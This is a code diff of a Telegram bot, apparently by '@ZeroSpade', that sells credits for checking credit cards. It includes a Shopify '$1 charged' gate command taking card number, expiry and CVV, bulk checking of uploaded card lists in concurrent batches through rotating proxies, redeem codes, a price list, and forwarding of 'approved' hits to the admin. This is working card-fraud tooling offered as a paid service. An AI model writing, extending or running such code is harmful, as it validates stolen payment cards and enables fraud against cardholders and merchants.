-    let amt = parseInt(parts[4] || "0");
-
-    if (action === "ban") user.isBanned = true;
-    if (action === "unban") user.isBanned = false;
-    if (action === "give") {
-      user.credits += amt;
-      let d = new Date();
-      d.setDate(d.getDate() + (amt >= 10000 ? 30 : 7));
-      user.planExpiry = d;
-      user.planName = amt >= 1000 ? `${amt / 1000}k Premium` : "Admin Granted";
-    }
-    await user.save();
-    bot.sendMessage(chatId, `✅ Success apply ${action} for ${targetId}`);
-  }
-}
-
-// User raw text handler for States
-bot.on("text", async (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text;
-
-  if (!text || text.startsWith("/")) return; // Ignore commands
-
-  let state = userStates[chatId];
-  if (state === "WAITING_ADMIN_USERID" && chatId === adminId) {
-    let targetId = text.trim();
-    bot.sendMessage(chatId, `Managing User: ${targetId}`, {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "Ban User", callback_data: `admin_mod_ban_${targetId}` },
-            { text: "Unban", callback_data: `admin_mod_unban_${targetId}` },
-          ],
-          [
-            {
-              text: "Give 1K (7D)",
-              callback_data: `admin_mod_give_${targetId}_1000`,
-            },
-            {
-              text: "Give 2K (7D)",
-              callback_data: `admin_mod_give_${targetId}_2000`,
-            },
-          ],
-          [
-            {
-              text: "Give 10K (30D)",
-              callback_data: `admin_mod_give_${targetId}_10000`,
-            },
-          ],
-        ],
-      },
-    });
-    delete userStates[chatId];
-  } else if (state === "WAITING_BROADCAST" && chatId === adminId) {
-    delete userStates[chatId];
-    const users = await User.find({ isBanned: false });
-    let sent = 0;
-    bot.sendMessage(chatId, "Sending broadcast, please wait...");
-    for (let u of users) {
-      try {
-        await bot.sendMessage(
-          u.chatId,
-          `📢 <b>BroadCast By Dev</b>\n━━━━━━━━━━━━━━━━━\n${escapeHTML(text)}`,
-          { parse_mode: "HTML" },
-        );
-        sent++;
-      } catch (e) {}
-    }
-    bot.sendMessage(chatId, `✅ Broadcast completed. Sent to ${sent} users.`);
-  }
-});
-
-// Redeem Command
+// =================== /redeem ===================
 bot.onText(/^\/redeem (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const code = match[1].trim();
-
-  let rd = await Redeem.findOne({ code });
-  if (!rd) return bot.sendMessage(chatId, "❌ Redeem Code Invalid");
-  if (rd.isUsed) return bot.sendMessage(chatId, "❌ Code Already Redeemed");
-
-  rd.isUsed = true;
-  rd.usedBy = chatId;
-  await rd.save();
-
-  let user = await getUser(chatId, msg.from.first_name);
-  user.credits += rd.credits;
-  user.planName = rd.planName;
-
-  let endD = new Date();
-  endD.setDate(endD.getDate() + rd.daysValid);
-  user.planExpiry = endD;
-
-  await user.save();
-
-  const rdText = `<tg-emoji emoji-id="6255910936557653676">🤝</tg-emoji> <b>𝐑𝐞𝐝𝐞𝐞𝐦 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥</b>\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5215191209131123104">💎</tg-emoji> <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐀𝐝𝐝𝐞𝐝:</b> ${rd.credits}\n<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐕𝐚𝐥𝐢𝐝 𝐅𝐨𝐫:</b> ${rd.daysValid} Days\n<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐏𝐥𝐚𝐧:</b> ${rd.planName}\n━━━━━━━━━━━━━━━━━\n<i>Enjoy your seamless checking!</i>`;
-
-  bot.sendMessage(chatId, rdText, { parse_mode: "HTML" });
-});
-
-// --- FAST MASS CHECKER LOGIC (.TXT FILE UPLOAD) ---
-bot.on("document", async (msg) => {
-  const chatId = msg.chat.id;
+  const rd = await Redeem.findOne({ code });
+  if (!rd) return bot.sendMessage(chatId, "\u274C Invalid Redeem Code.");
+  if (rd.isUsed) return bot.sendMessage(chatId, "\u274C Code Already Redeemed.");
+  rd.isUsed = true; rd.usedBy = chatId; await rd.save();
   const user = await getUser(chatId, msg.from.first_name);
+  user.credits += rd.credits; user.planName = rd.planName;
+  const endD = new Date(); endD.setDate(endD.getDate() + rd.daysValid);
+  user.planExpiry = endD; await user.save();
+  bot.sendMessage(chatId,
+    "<tg-emoji emoji-id=\"6255910936557653676\">\uD83E\uDD1D</tg-emoji> <b>Redeem Successful!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Credits:</b> "+rd.credits+"\n<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Valid:</b> "+rd.daysValid+" Days\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>Plan:</b> "+rd.planName+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<i>Enjoy!</i>",
+    { parse_mode: "HTML" });
+});
 
-  if (userStates[chatId] !== "WAITING_TXT") return;
-  delete userStates[chatId];
-
-  if (user.isBanned) return bot.sendMessage(chatId, "⚠️ You are blocked.");
-
-  const mimeType = msg.document.mime_type;
-  const fileName = msg.document.file_name || "";
-
-  if (mimeType !== "text/plain" && !fileName.endsWith(".txt")) {
-    return bot.sendMessage(chatId, "❌ Please upload a valid .txt file only!");
-  }
-
-  const statusMsg = await bot.sendMessage(
-    chatId,
-    `<tg-emoji emoji-id="5213452215527677338">⏳</tg-emoji> <b>𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐟𝐢𝐥𝐞 𝐚𝐧𝐝 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤...</b>`,
-    { parse_mode: "HTML" },
-  );
-
+// =================== CALLBACKS ===================
+bot.on("callback_query", async (cb) => {
+  const chatId = cb.message.chat.id;
+  const msgId = cb.message.message_id;
+  if (cb.data === "noop") { bot.answerCallbackQuery(cb.id).catch(() => {}); return; }
   try {
-    const fileLink = await bot.getFileLink(msg.document.file_id);
-    const fileRes = await axios.get(fileLink);
-    const textData = fileRes.data;
-
-    let lines = textData
-      .split("\n")
-      .map((l) => l.trim())
-      .filter((l) => l.length > 10);
-    if (lines.length === 0) {
-      return bot.editMessageText("❌ No valid CCs found in file.", {
-        chat_id: chatId,
-        message_id: statusMsg.message_id,
-      });
+    if (cb.data === "admin_user_menu") { sendUserHome(chatId); }
+    else if (cb.data === "gate_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: "Charged", callback_data: "charged_menu", icon_custom_emoji_id: "6136316288005314906" }]]}, { chat_id: chatId, message_id: msgId }); }
+    else if (cb.data === "charged_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: "Shopify", callback_data: "sh_info", icon_custom_emoji_id: "6138961691506907344" }]]}, { chat_id: chatId, message_id: msgId }); }
+    else if (cb.data === "sh_info") {
+      bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Gate</b> \u27A0 Shopify 1$\n<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Command</b> \u27A0 <code>/sh cc|mm|yy|cvv</code>\n<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Health</b> \u27A0 100% Active\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6138532229137049159\">\uD83D\uDD25</tg-emoji> Powered By " + escapeHTML(BOT_NAME),
+        { parse_mode: "HTML" });
     }
-
-    // Check Credits
-    if (!(await deductCredits(user, lines.length))) {
-      let lackMsg = `<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>Insufficient Credits!</b>\nYou have ${user.credits} credits, but file contains ${lines.length} CCs.\nPlease buy or redeem.`;
-      return bot.editMessageText(lackMsg, {
-        chat_id: chatId,
-        message_id: statusMsg.message_id,
-        parse_mode: "HTML",
-      });
+    else if (cb.data === "mass_menu") { bot.editMessageReplyMarkup({ inline_keyboard: [[{ text: ".txt File", callback_data: "mass_txt", icon_custom_emoji_id: "6138728977293907990" }]]}, { chat_id: chatId, message_id: msgId }); }
+    else if (cb.data === "mass_txt") { userStates[chatId]="WAITING_TXT"; bot.sendMessage(chatId, "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send your .txt file.</b>\n<i>One CC per line</i>", { parse_mode: "HTML" }); }
+    else if (cb.data === "tools_menu") {
+      bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>TOOLS MENU</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/sh</code> - Shopify Checker\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/shmt</code> - Mass Check\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/addproxy</code> - Add Proxy\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/myproxy</code> - View Proxies\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/checkproxy</code> - Check Live\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/clearproxy</code> - Clear\n<tg-emoji emoji-id=\"6253672854869511544\">\u2714\uFE0F</tg-emoji> <code>/redeem</code> - Redeem Code",
+        { parse_mode: "HTML" });
     }
-
-    bot.editMessageText(
-      `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> <b>𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 ${lines.length} 𝐜𝐚𝐫𝐝𝐬... 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.</b>\nApproved hits will be sent directly!`,
-      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" },
-    );
-
-    let approvedCount = 0;
-    let declinedCount = 0;
-
-    // Concurrent Batch Processing for Maximum Speed
-    const concurrencyLimit = 3;
-
-    for (let i = 0; i < lines.length; i += concurrencyLimit) {
-      const chunk = lines.slice(i, i + concurrencyLimit);
-      const promises = chunk.map((cc) => processCard(cc, getRandomProxy(user.proxies)));
-      const results = await Promise.all(promises);
-
-      for (let data of results) {
-        if (data.isApproved) {
-          approvedCount++;
-          const resMsg = formatCardResult(
-            data,
-            msg.from.first_name,
-            msg.from.id,
-          );
-          await bot.sendMessage(chatId, resMsg, { parse_mode: "HTML" });
-
-          if (chatId !== adminId) {
-            bot.sendMessage(
-              adminId,
-              `🟢 <b>𝐌𝐚𝐬𝐬 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐇𝐢𝐭 𝐁𝐲 <a href="tg://user?id=${chatId}">${escapeHTML(msg.from.first_name)}</a></b>\n━━━━━━━━━\n${resMsg}`,
-              { parse_mode: "HTML" },
-            );
-          }
-        } else {
-          declinedCount++;
-        }
-
-        // Track total hits
-        let u = await User.findOne({ chatId });
-        if (data.isApproved) u.totalApproved++;
-        else u.totalDeclined++;
-        await u.save();
-      }
+    else if (cb.data === "pricing_menu") {
+      bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>"+escapeHTML(BOT_NAME)+" PRICING</b> <tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>1,000 Credits</b> \u2014 $5\n\u23F3 7 Days\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>2,000 Credits</b> \u2014 $8\n\u23F3 7 Days\n\n<tg-emoji emoji-id=\"6253656229051109191\">\u2714\uFE0F</tg-emoji> <b>10,000 Credits</b> \u2014 $15\n\u23F3 30 Days\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<i>Secure, Fast, Reliable.</i>",
+        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Contact Owner", url: "https://t.me/ZeroSpade" }]] } });
     }
+    else if (cb.data === "profile_menu") {
+      const user = await getUser(chatId, cb.from.first_name);
+      const total = user.totalApproved + user.totalDeclined;
+      const jd = new Date(user.joinDate).toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
+      let exp = "No Expiry";
+      if (user.planExpiry) exp = new Date(user.planExpiry).toLocaleDateString("en-GB",{day:"2-digit",month:"short",year:"numeric"});
+      bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>YOUR PROFILE</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\uD83D\uDCC5 <b>Joined:</b> "+jd+"\n<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Total Checked:</b> "+total+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Approved:</b> "+user.totalApproved+"\n<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji> <b>Declined:</b> "+user.totalDeclined+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>Plan:</b> "+escapeHTML(user.planName)+"\n<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Validity:</b> "+exp+"\n<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDCB0</tg-emoji> <b>Credits:</b> "+user.credits+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+        { parse_mode: "HTML" });
+    }
+    else if (cb.data.startsWith("admin_")) { if (chatId !== ADMIN_ID) return; await handleAdminMenu(cb, chatId); }
+  } catch(err) { console.error("CB Error:", err); }
+  bot.answerCallbackQuery(cb.id).catch(() => {});
+});
 
-    const finalMsg = `<tg-emoji emoji-id="6138803821394009204">✨</tg-emoji> <b>𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!</b>\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="6253672854869511544">✔️</tg-emoji> <b>Approved:</b> ${approvedCount}\n<tg-emoji emoji-id="5402104393396931859">❌</tg-emoji> <b>Declined:</b> ${declinedCount}\n━━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>Dev: @ZeroSpade</b>`;
+// =================== ADMIN MENU ===================
+async function handleAdminMenu(cb, chatId) {
+  if (cb.data === "admin_users_list") {
+    const users = await User.find({}, "firstName chatId credits planName");
+    const jl = JSON.stringify(users, null, 2);
+    if (jl.length < 4000) bot.sendMessage(chatId, "<b>Users:</b>\n<pre>"+escapeHTML(jl)+"</pre>", { parse_mode: "HTML" });
+    else bot.sendDocument(chatId, Buffer.from(jl,"utf-8"), { filename: "users.json" });
+  } else if (cb.data === "admin_manage_users") {
+    userStates[chatId] = "WAITING_ADMIN_USERID"; bot.sendMessage(chatId, "Enter Target User Chat ID:");
+  } else if (cb.data === "admin_broadcast") {
+    userStates[chatId] = "WAITING_BROADCAST"; bot.sendMessage(chatId, "Send broadcast message:");
+  } else if (cb.data === "admin_gen_redeem") {
+    bot.sendMessage(chatId, "Select pack:", { reply_markup: { inline_keyboard: [
+      [{ text: "Trial 100 (1D)", callback_data: "admin_rd_trial" }],
+      [{ text: "1,000 Credits (7D)", callback_data: "admin_rd_1k" }, { text: "2,000 Credits (7D)", callback_data: "admin_rd_2k" }],
+      [{ text: "10,000 Credits (30D)", callback_data: "admin_rd_10k" }],
+    ]}});
+  } else if (cb.data.startsWith("admin_rd_")) {
+    const label=cb.data.replace("admin_rd_",""), rand=Math.random().toString(36).substring(2,7).toUpperCase();
+    let code="",creds=0,days=0,pName="";
+    if(label==="trial"){code="1D_"+rand+"_SPADECHKR";creds=100;days=1;pName="Trial";}
+    else if(label==="1k"){code="7D_"+rand+"_SPADECHKR";creds=1000;days=7;pName="1k Premium";}
+    else if(label==="2k"){code="7D_"+rand+"_SPADECHKR";creds=2000;days=7;pName="2k Premium";}
+    else if(label==="10k"){code="30D_"+rand+"_SPADECHKR";creds=10000;days=30;pName="10k Elite";}
+    await Redeem.create({code,credits:creds,daysValid:days,planName:pName});
+    bot.sendMessage(chatId,"\u2705 <b>Code:</b>\n\n<code>"+code+"</code>\n\n"+pName+" | "+creds+" Credits | "+days+" Days",{parse_mode:"HTML"});
+  } else if (cb.data.startsWith("admin_mod_")) {
+    const parts=cb.data.split("_"), action=parts[2], targetId=parts[3];
+    const user=await User.findOne({chatId:targetId});
+    if(!user) return bot.sendMessage(chatId,"\u274C User not found.");
+    const amt=parseInt(parts[4]||"0");
+    if(action==="ban") user.isBanned=true;
+    if(action==="unban") user.isBanned=false;
+    if(action==="give"){user.credits+=amt;const d=new Date();d.setDate(d.getDate()+(amt>=10000?30:7));user.planExpiry=d;user.planName=amt>=1000?(amt/1000)+"k Premium":"Admin Granted";}
+    await user.save();
+    bot.sendMessage(chatId,"\u2705 Done! "+action+" on "+targetId);
+  }
+}
 
-    bot.sendMessage(chatId, finalMsg, { parse_mode: "HTML" });
-    bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
-  } catch (error) {
-    console.error("Mass check error:", error);
-    bot.sendMessage(chatId, "❌ Error processing mass check file.");
+// =================== TEXT HANDLER ===================
+bot.on("text", async (msg) => {
+  const chatId=msg.chat.id, text=msg.text;
+  if (!text||text.startsWith("/")) return;
+  const state=userStates[chatId];
+  if (state==="WAITING_ADDSITE"&&chatId===ADMIN_ID) { delete userStates[chatId]; await processSiteAdd(chatId, text); }
+  else if (state==="WAITING_ADDPROXY") { delete userStates[chatId]; await processProxyAdd(chatId, text); }
+  else if (state==="WAITING_ADMIN_USERID"&&chatId===ADMIN_ID) {
+    const targetId=text.trim();
+    bot.sendMessage(chatId,"Managing: <code>"+targetId+"</code>",{parse_mode:"HTML",reply_markup:{inline_keyboard:[
+      [{text:"\uD83D\uDEAB Ban",callback_data:"admin_mod_ban_"+targetId},{text:"\u2705 Unban",callback_data:"admin_mod_unban_"+targetId}],
+      [{text:"Give 1K",callback_data:"admin_mod_give_"+targetId+"_1000"},{text:"Give 2K",callback_data:"admin_mod_give_"+targetId+"_2000"}],
+      [{text:"Give 10K",callback_data:"admin_mod_give_"+targetId+"_10000"}],
+    ]}});
+    delete userStates[chatId];
+  } else if (state==="WAITING_BROADCAST"&&chatId===ADMIN_ID) {
+    delete userStates[chatId];
+    const users=await User.find({isBanned:false}); let sent=0;
+    bot.sendMessage(chatId,"\uD83D\uDCE2 Sending...");
+    for(const u of users){try{await bot.sendMessage(u.chatId,"\uD83D\uDCE2 <b>Broadcast</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"+escapeHTML(text),{parse_mode:"HTML"});sent++;}catch(e){}}
+    bot.sendMessage(chatId,"\u2705 Sent to "+sent+" users.");
   }
 });
 
-// --- ADMIN COMMAND: ADD SITE ---
-bot.onText(/^\/addsite (.+)/, async (msg, match) => {
-  try {
-    if (msg.chat.id !== adminId) return;
-    let url = match[1].trim();
-    if (!url.startsWith("http")) url = "https://" + url;
-    if (!url.endsWith("/")) url = url + "/";
-    await Config.findOneAndUpdate(
-      { key: "main_config" },
-      { shopifySiteUrl: url },
-      { upsert: true },
-    );
-    bot.sendMessage(msg.chat.id, `✅ Site updated to: ${url}`);
-  } catch (error) {}
+// =================== DOCUMENT HANDLER ===================
+bot.on("document", async (msg) => {
+  const chatId=msg.chat.id;
+  const state=userStates[chatId];
+  const mime=msg.document.mime_type, fname=msg.document.file_name||"";
+  const isTxt=mime==="text/plain"||fname.endsWith(".txt");
+
+  if (state==="WAITING_ADDSITE"&&chatId===ADMIN_ID&&isTxt) {
+    delete userStates[chatId];
+    try { const fl=await bot.getFileLink(msg.document.file_id); const fr=await axios.get(fl); await processSiteAdd(chatId,fr.data); }
+    catch(e){ bot.sendMessage(chatId,"\u274C Error reading file."); }
+    return;
+  }
+  if (state==="WAITING_ADDPROXY"&&isTxt) {
+    delete userStates[chatId];
+    try { const fl=await bot.getFileLink(msg.document.file_id); const fr=await axios.get(fl); await processProxyAdd(chatId,fr.data); }
+    catch(e){ bot.sendMessage(chatId,"\u274C Error reading file."); }
+    return;
+  }
+  if (state==="WAITING_TXT") {
+    delete userStates[chatId];
+    const user=await getUser(chatId,msg.from.first_name);
+    if(user.isBanned) return bot.sendMessage(chatId,"\u26D4 Blocked.");
+    if(!isTxt) return bot.sendMessage(chatId,"\u274C Upload .txt file only!");
+    const statusMsg=await bot.sendMessage(chatId,"<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Starting Mass Check...</b>",{parse_mode:"HTML"});
+    try {
+      const fl=await bot.getFileLink(msg.document.file_id);
+      const fr=await axios.get(fl);
+      const lines=fr.data.split("\n").map(l=>l.trim()).filter(l=>l.length>10);
+      if(lines.length===0) return bot.editMessageText("\u274C No valid CCs found.",{chat_id:chatId,message_id:statusMsg.message_id});
+      if(!(await deductCredits(user,lines.length))) return bot.editMessageText(
+        "\u274C <b>Insufficient Credits!</b>\nHave: "+user.credits+" | Need: "+lines.length,
+        {chat_id:chatId,message_id:statusMsg.message_id,parse_mode:"HTML"});
+      bot.editMessageText("<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Processing "+lines.length+" cards...</b>\n<i>Approved hits will appear below</i>",{chat_id:chatId,message_id:statusMsg.message_id,parse_mode:"HTML"});
+      let approved=0,declined=0,charged=0;
+      // Mass check — concurrency 5 for speed
+      for(let i=0;i<lines.length;i+=5){
+        const chunk=lines.slice(i,i+5);
+        const results=await Promise.all(chunk.map(cc=>processCard(cc,getRandomItem(user.proxies))));
+        for(const data of results){
+          if(data.category==="approved"||data.category==="charged"){
+            if(data.category==="charged") charged++; else approved++;
+            const rm=formatCardResult(data,msg.from.first_name,msg.from.id);
+            const kb=getResultKeyboard(data.category);
+            await bot.sendMessage(chatId,rm,{parse_mode:"HTML",disable_web_page_preview:true,reply_markup:kb});
+            if(chatId!==ADMIN_ID) bot.sendMessage(ADMIN_ID,"\uD83D\uDFE2 <b>MASS HIT</b>\nBy: <a href=\"tg://user?id="+chatId+"\">"+escapeHTML(msg.from.first_name)+"</a>\n"+rm,{parse_mode:"HTML",disable_web_page_preview:true});
+          } else { declined++; }
+          const u=await User.findOne({chatId});
+          if(data.category==="approved"||data.category==="charged")u.totalApproved++;else u.totalDeclined++;
+          await u.save();
+        }
+      }
+      bot.sendMessage(chatId,
+        "<tg-emoji emoji-id=\"6138803821394009204\">\u2728</tg-emoji> <b>Mass Check Complete!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 <b>Approved:</b> "+approved+"\n\uD83D\uDCB3 <b>Charged:</b> "+charged+"\n\u274C <b>Declined:</b> "+declined+"\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> Dev: @ZeroSpade",
+        {parse_mode:"HTML"});
+      bot.deleteMessage(chatId,statusMsg.message_id).catch(()=>{});
+    } catch(err){console.error(err);bot.sendMessage(chatId,"\u274C Error: "+err.message);}
+  }
 });
